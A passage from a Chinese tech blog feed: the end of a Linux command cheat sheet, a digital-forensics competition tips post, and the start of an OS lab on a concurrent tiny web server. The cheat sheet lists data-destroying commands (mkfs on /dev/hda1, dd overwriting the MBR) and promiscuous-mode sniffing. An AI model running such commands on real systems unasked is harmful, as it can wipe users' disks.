class="hljs-string">&quot;string1&quot;</span>的行 <br>sed -e <span class="hljs-string">&#x27;s/ *$//&#x27;</span> example.txt 删除每一行最后的空白字符 <br>sed -e <span class="hljs-string">&#x27;s/stringa1//g&#x27;</span> example.txt 从文档中只删除词汇 <span class="hljs-string">&quot;string1&quot;</span> 并保留剩余全部 <br>sed -n <span class="hljs-string">&#x27;1,5p;5q&#x27;</span> example.txt 查看从第一行到第5行内容 <br>sed -n <span class="hljs-string">&#x27;5p;5q&#x27;</span> example.txt 查看第5行 <br>sed -e <span class="hljs-string">&#x27;s/00*/0/g&#x27;</span> example.txt 用单个零替换多个零 <br><span class="hljs-built_in">cat</span> -n file1 标示文件的行数 <br><span class="hljs-built_in">cat</span> example.txt | awk <span class="hljs-string">&#x27;NR%2==1&#x27;</span> 删除example.txt文件中的所有偶数行 <br><span class="hljs-built_in">echo</span> a b c | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> 查看一行第一栏 <br><span class="hljs-built_in">echo</span> a b c | awk <span class="hljs-string">&#x27;&#123;print $1,$3&#125;&#x27;</span> 查看一行的第一和第三栏 <br><span class="hljs-built_in">paste</span> file1 file2 合并两个文件或两栏的内容 <br><span class="hljs-built_in">paste</span> -d <span class="hljs-string">&#x27;+&#x27;</span> file1 file2 合并两个文件或两栏的内容，中间用<span class="hljs-string">&quot;+&quot;</span>区分 <br><span class="hljs-built_in">sort</span> file1 file2 排序两个文件的内容 <br><span class="hljs-built_in">sort</span> file1 file2 | <span class="hljs-built_in">uniq</span> 取出两个文件的并集(重复的行只保留一份) <br><span class="hljs-built_in">sort</span> file1 file2 | <span class="hljs-built_in">uniq</span> -u 删除交集，留下其他的行 <br><span class="hljs-built_in">sort</span> file1 file2 | <span class="hljs-built_in">uniq</span> -d 取出两个文件的交集(只留下同时存在于两个文件中的文件) <br><span class="hljs-built_in">comm</span> -1 file1 file2 比较两个文件的内容只删除 <span class="hljs-string">&#x27;file1&#x27;</span> 所包含的内容 <br><span class="hljs-built_in">comm</span> -2 file1 file2 比较两个文件的内容只删除 <span class="hljs-string">&#x27;file2&#x27;</span> 所包含的内容 <br><span class="hljs-built_in">comm</span> -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分 <br></code></pre></td></tr></table></figure><h3 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a>字符设置和文件格式转换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX <br>unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS <br>recode ..HTML &lt; page.txt &gt; page.html 将一个文本文件转换成html <br>recode -l | more 显示所有允许的转换格式 <br></code></pre></td></tr></table></figure><h3 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 <br>fsck /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 <br>fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 <br>e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 <br>e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 <br>fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 <br>fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 <br>fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 <br>dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 <br></code></pre></td></tr></table></figure><h3 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a>初始化一个文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkfs /dev/hda1 在hda1分区创建一个文件系统 <br>mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 <br>mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 <br>mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 <br>fdformat -n /dev/fd0 格式化一个软盘 <br>mkswap /dev/hda3 创建一个swap文件系统 <br></code></pre></td></tr></table></figure><h3 id="SWAP文件系统"><a href="#SWAP文件系统" class="headerlink" title="SWAP文件系统"></a>SWAP文件系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkswap /dev/hda3 创建一个swap文件系统 <br>swapon /dev/hda3 启用一个新的swap文件系统 <br>swapon /dev/hda2 /dev/hdb3 启用两个swap分区 <br></code></pre></td></tr></table></figure><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">dump -0aj -f /tmp/home0.bak /home 制作一个 <span class="hljs-string">&#x27;/home&#x27;</span> 目录的完整备份 <br>dump -1aj -f /tmp/home0.bak /home 制作一个 <span class="hljs-string">&#x27;/home&#x27;</span> 目录的交互式备份 <br>restore -<span class="hljs-keyword">if</span> /tmp/home0.bak 还原一个交互式备份 <br>rsync -rogpav --delete /home /tmp 同步两边的目录 <br>rsync -rogpav -e ssh --delete /home ip_address:/tmp 通过SSH通道rsync <br>rsync -az -e ssh --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 <br>rsync -az -e ssh --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 <br><span class="hljs-built_in">dd</span> bs=1M <span class="hljs-keyword">if</span>=/dev/hda | gzip | ssh user@ip_addr <span class="hljs-string">&#x27;dd of=hda.gz&#x27;</span> 通过ssh在远程主机上执行一次备份本地磁盘的操作 <br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 <br>tar -Puf backup.tar /home/user 执行一次对 <span class="hljs-string">&#x27;/home/user&#x27;</span> 目录的交互式备份操作 <br>( <span class="hljs-built_in">cd</span> /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr <span class="hljs-string">&#x27;cd /home/share/ &amp;&amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个目录内容 <br>( tar c /home ) | ssh -C user@ip_addr <span class="hljs-string">&#x27;cd /home/backup-home &amp;&amp; tar x -p&#x27;</span> 通过ssh在远程目录中复制一个本地目录 <br>tar cf - . | (<span class="hljs-built_in">cd</span> /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 <br>find /home/user1 -name <span class="hljs-string">&#x27;*.txt&#x27;</span> | xargs <span class="hljs-built_in">cp</span> -av --target-directory=/home/backup/ --parents 从一个目录查找并复制所有以 <span class="hljs-string">&#x27;.txt&#x27;</span> 结尾的文件到另一个目录 <br>find /var/log -name <span class="hljs-string">&#x27;*.log&#x27;</span> | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 <span class="hljs-string">&#x27;.log&#x27;</span> 结尾的文件并做成一个bzip包 <br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 <br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 <br><br><br></code></pre></td></tr></table></figure><h3 id="网络-（以太网和WIFI无线）"><a href="#网络-（以太网和WIFI无线）" class="headerlink" title="网络 - （以太网和WIFI无线）"></a>网络 - （以太网和WIFI无线）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">ifconfig eth0 显示一个以太网卡的配置 <br>ifup eth0 启用一个 <span class="hljs-string">&#x27;eth0&#x27;</span> 网络设备 <br>ifdown eth0 禁用一个 <span class="hljs-string">&#x27;eth0&#x27;</span> 网络设备 <br>ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址 <br>ifconfig eth0 promisc 设置 <span class="hljs-string">&#x27;eth0&#x27;</span> 成混杂模式以嗅探数据包 (sniffing) <br>dhclient eth0 以dhcp模式启用 <span class="hljs-string">&#x27;eth0&#x27;</span> <br>route -n show routing table <br>route add -net 0/0 gw IP_Gateway configura default gateway <br>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network <span class="hljs-string">&#x27;192.168.0.0/16&#x27;</span> <br>route del 0/0 gw IP_gateway remove static route <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;1&quot;</span> &gt; /proc/sys/net/ipv4/ip_forward activate ip routing <br>hostname show hostname of system <br>host www.example.com lookup hostname to resolve name to ip address and viceversa<br>nslookup www.example.com lookup hostname to resolve name to ip address and viceversa<br>ip <span class="hljs-built_in">link</span> show show <span class="hljs-built_in">link</span> status of all interfaces <br>mii-tool eth0 show <span class="hljs-built_in">link</span> status of <span class="hljs-string">&#x27;eth0&#x27;</span> <br>ethtool eth0 show statistics of network card <span class="hljs-string">&#x27;eth0&#x27;</span> <br>netstat -tup show all active network connections and their PID <br>netstat -tupl show all network services listening on the system and their PID <br>tcpdump tcp port 80 show all HTTP traffic <br>iwlist scan show wireless networks <br>iwconfig eth1 show configuration of a wireless network card <br>hostname show hostname <br>host www.example.com lookup hostname to resolve name to ip address and viceversa <br>nslookup www.example.com lookup hostname to resolve name to ip address and viceversa <br>whois www.example.com lookup on Whois database <br></code></pre></td></tr></table></figure><h3 id="JPS工具"><a href="#JPS工具" class="headerlink" title="JPS工具"></a>JPS工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">jps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。<br>    我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 <span class="hljs-built_in">id</span>。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其<span class="hljs-built_in">id</span>号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。<br>     使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。<br>jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path.<br>$&gt; jps<br>23991 Jps<br>23789 BossMain<br>23651 Resin<br><br>比较常用的参数：<br>-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数<br>$&gt;  jps -q<br>28680<br>23789<br>23651<br>-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null<br>$&gt; jps -m<br>28715 Jps -m<br>23789 BossMain<br>23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log<br>-l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名<br>$&gt; jps -l<br>28729 sun.tools.jps.Jps<br>23789 com.asiainfo.aimc.bossbi.BossMain<br>23651 com.caucho.server.resin.Resin<br>-v 输出传递给JVM的参数<br>$&gt; jps -v<br>23789 BossMain<br>28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd<br>k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m<br>23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl -<br>Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl<br>sudo jps看到的进程数量最全<br>jps 192.168.0.77<br>列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099<br>（前提是远程服务器提供jstatd服务）<br>注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>电子数据取证参赛经验总结</title>
    <link href="/blog/2019/12/01/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%8F%82%E8%B5%9B%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2019/12/01/%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%8F%82%E8%B5%9B%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>参加了三次取证比赛了，也谈不上有什么经验吧，就简单写一下一些注意事项以及可能会踩坑的地方和一些技巧吧。</strong></p><p><img src="/images/fj25.jpg"></p><span id="more"></span><h2 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h2><p>1.刚开始的第一个问题一般情况下都是问你镜像的哈希或者磁盘的哈希值，这在实际中应该是为了保证镜像数据的完整性，一定要注意题目问的是什么的哈希值，磁盘的哈希值要放到取证软件中之后再看，镜像文件的哈希就是.dd文件的哈希，可以直接计算。</p><p>2.接下来可能会有一些基础的问题，比如系统最后一次关机时间，系统安装时间，系统用户信息等等，都可以在取证大师中的取证结果中查看。</p><p>3.当题目中问到某某文件有关的信息的时候，如果你比较了解这个文件具体作用、具体路径，就可以根据经验找这个文件，如果不了解就可以采取暴力检索的方式直接搜索想要的结果，然后点击跳转到源文件即可找到想要的文件。</p><p>4.Windows注册表中有很多有用的东西，可以了解一下一些重要的注册表项的含义。</p><p>5.使用火眼仿真软件来做可能会有意想不到的收获，比如桌面有个txt文件，里面有账号密码哈哈哈哈。</p><p>6.和时间相关的题目务必注意选项里面的时间是不是UTC +8，世界标准时间是UTC时间也就是0时区的时间，对标格林威治时间，中国是使用东八区时间也就是UTC +8 ，选择的时候一定要注意选项问的到底是哪个时间。</p><p>7.关于内存取证方面，VolatilityWorkbench是个不错的选择，不用启动kali虚拟机，也不用记住命令，但是组件不能自由添加，不过整体还挺好用。</p><p>8.你需要有一定的软件逆向能力，比如使用IDA，也要会一些DLL函数作用。还有apk的逆向分析等等。</p><p>9.浏览器的访问记录有很多有用的东西，比如我们攻击某个网站，可能会需要搜索资料，历史纪录里面就可能有想要的东西。</p><p>10.邮件里面可能会有太多太多的有用信息，附件很可能就是病毒，不要在本地电脑运行！</p><p>11.洋葱网络可以了解一下，一般搞事情的都会在背地里搞，所以很可能涉及洋葱网络。</p><p>12.学会计算扇区、簇、以及一系列的硬件存储相关的东西，查看簇的大小可以用chkdsk命令，具体怎么用网上有。</p><h2 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h2><p>1.Linux很有可能涉及RAID重组，这里也是一个难点，如果组不出来后面的题基本上是没法做的，上次美亚杯就是吃了这个亏，如果组出来一等奖稳稳的。RAID重组最简单也是最有效的办法就是使用取证大师自动重组，但是很重要的一点也是我们刚知道的一点就是先用FTK把镜像文件挂载到本地之后再用取证大师自动重组，这样会大大提高效率！如果取证大师组不出来，那就可以试试用RAID Reconstructor试试，有的大佬还能直接用Winhex看磁盘看出来，，，我也不是很懂这是什么操作。如果都组不出来，那就可以尝试把镜像放进火眼仿真软件里面了，尝试一下是不是软RAID，mdadm -D 查看软件raid信息。如果实在组不出来，然后还有很多时间的话那就慢慢试试，运气好几百种可能你一下子就试出来了也不好说。</p><p>2.Linux一般是服务器，或者是攻击者的kali机。服务器上很多配置信息都可以在取证大师取证结果中看到，需要了解Linux媒体文件的挂载方式，理解LVM等一系列存储相关的东西怎么看，命令是啥。</p><p>3.服务器上也可能是一个网站的服务器，这就要求你的队伍里面还需要一个懂web的，了解docker容器使用。</p><p>4.Linux的几个常见目录是干什么的要有所了解，比如DDos攻击上传的文件一般在&#x2F;var目录下</p><p>5.bash的history是一个好东西</p><p>6.Linux的用户登录信息，权限信息，怎么提权，最好也要了解一下</p><h2 id="手机取证："><a href="#手机取证：" class="headerlink" title="手机取证："></a>手机取证：</h2><p>1.iPhone很有可能就在嫌疑人笔记本电脑上有备份，所以准备一个iPhone备份恢复工具非常有必要。安卓手机也有可能在电脑有备份。</p><p>2.安卓的目录信息稍微了解一下</p><p>3.短信息里面有惊喜</p><p>4.微信聊天数据db文件是加密的，有加密方法，具体好像是用IMEI+啥东西我忘记了，可以查一下，很重要</p><p>5.手机取证可以用手机大师或者是用火眼取证做。</p><h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>流量分析用wireshark做，筛选方法自己去学习一下，流量包可以看出DDos攻击或者是其他DNS等有用的数据。其他日志分析就自己看着来吧。</p><p>总结：取证比赛呢，可能上手比较简单，刚开始你可能会觉得不就是操作软件找东西嘛，点点点就行了。但是越往后你越会发现其实没那么简单，你需要深刻理解操作系统，知识点要覆盖很全面，还要了解黑客的攻击手段，想做到做的每个题都对确实挺难的，看选项一定看清楚再选，问哈希值的时候看后几位别看前几位。欢迎大家参加取证比赛，还是挺有意思的，也会对大家日常学习有所帮助。</p><p>以上内容如有不对的地方欢迎批评指正！</p>]]></content>
    
    
    
    <tags>
      
      <tag>电子数据取证</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用多进程、多线程、多路复用实现Web服务器</title>
    <link href="/blog/2019/10/30/%E4%BD%BF%E7%94%A8%E5%A4%9A%E8%BF%9B%E7%A8%8B%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E3%80%81%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <url>/blog/2019/10/30/%E4%BD%BF%E7%94%A8%E5%A4%9A%E8%BF%9B%E7%A8%8B%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E3%80%81%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%AE%9E%E7%8E%B0Web%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>操作系统课程的实验，要求使用多进程、多线程、多路复用实现Web服务器并发，使用的是tiny的一个简单的WEB服务器源码进行修改，使其支持多进程、多线程、多路复用。</strong></p><p><img src="/images/fj24.jpg"></p><span id="more"></span><h2 id="相关原理"><a href="#相关原理" class="headerlink" title="相关原理"></a>相关原理</h2><h3 id="TCP套接字通信"><a href="#TCP套接字通信" class="headerlink" title="TCP套接字通信"></a>TCP套接字通信</h3><p>Echo通信例子：</p><p><img src="/images/os4-1.png"></p><p>select：</p><p><img src="/images/os4-2.png"></p><p>文件描述符集合操作：</p><p><img src="/images/os4-3.png"></p><p>一般来说，在每次使用select()函数之前，首先使用FD_ZERO()和FD_SET()来初始化文件描述符集（在需要重复调用select()函数的时候，先把一次初始化好的文件描述符集备份下来，每次读取它即可）。在select()函数返回之后，可循环使用FD_ISSET()来测试描述符集，在执行完对相关文件描述符的操作之后，使用FD_CLR()来清除描述符集。<br>另外，select()函数中的timeout是一个struct timeval类型的指针，该结构体如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> </span><br><span class="hljs-class">&#123;</span><br>     <span class="hljs-type">long</span> tv_sec; <span class="hljs-comment">/* 秒 */</span><br>     <span class="hljs-type">long</span> tv_unsec; <span class="hljs-comment">/* 微秒 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="WEB-server"><a href="#WEB-server" class="headerlink" title="WEB server"></a>WEB server</h3><p>模型：</p><p><img src="/images/os4-4.png"></p><p><img src="/images/os4-5.png"></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="多进程实现服务器并发"><a href="#多进程实现服务器并发" class="headerlink" title="多进程实现服务器并发"></a>多进程实现服务器并发</h3><p>调用Fork创建子进程，父进程继续监听。在子进程中对客户端进行处理，因为fork完全复制父进程，所以要在子进程中关掉监听套接字listenfd。子进程处理完之后，父子进程都要关掉连接套接字connfd。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); //line:netp:tiny:accept</span><br><span class="hljs-comment">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                    port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">doit(connfd);                                             //line:netp:tiny:doit</span><br><span class="hljs-comment">Close(connfd);                                            //line:netp:tiny:close</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">// 多进程 </span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); <br>        <span class="hljs-keyword">if</span> (Fork() == <span class="hljs-number">0</span>) &#123;<br>            Close(listenfd);<br>            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                        port, MAXLINE, <span class="hljs-number">0</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>            doit(connfd);<br>            Close(connfd);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        Close(connfd);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>sudo ./tiny 6666<br></code></pre></td></tr></table></figure><p><img src="/images/os4-6.png"></p><p><img src="/images/os4-7.png"></p><h3 id="多线程实现服务器并发"><a href="#多线程实现服务器并发" class="headerlink" title="多线程实现服务器并发"></a>多线程实现服务器并发</h3><p>定义一个tid用于记录创建线程的id，主线程用于监听套接字，有新的连接建立之后创建一个副线程，主线程继续监听。副线程调用执行线程函数，在该函数中完成对新建立连接的处理，处理完之后关闭套接字，副线程结束。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> connfd = *((<span class="hljs-type">int</span> *)argv);<br>    Pthread_detach(pthread_self());<br>    doit(connfd);  <br>    Close(connfd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span 